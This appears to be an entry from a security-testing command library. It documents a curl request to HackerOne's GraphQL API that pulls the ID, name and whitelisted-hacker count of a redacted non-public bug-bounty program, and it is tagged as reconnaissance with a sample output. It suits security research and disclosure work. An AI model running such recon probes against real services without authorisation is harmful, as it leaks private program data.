---
id: cmd-graphql-nonpublic
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Content-Type:
  application/json" -d '{"query": "query
  {team(handle:\"█████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
tags:
  - graphql
  - recon
type: command
output: >-
  {"data":{"team":{"id":"██████","name":"███","handle":"█████████","whitelisted_hackers":{"total_count":94}}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.116Z'
verified: false
validated: true
submitted: true
---
# graphql-query-nonpublic-program

## Command

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"█████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

## Description

Queries a non-fully public program team handle to disclose whitelisted hackers count, useful for testing vulnerability scope.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d '{...}'` | JSON with handle: \"█████\" (redacted non-public handle) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"█████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

## Expected Output

JSON with total_count:94 or 203.

## Related

- [[commands/graphql-query-security-team]]
- [[procedures/Test-Whitelisted-Hackers-on-Program-Types]]
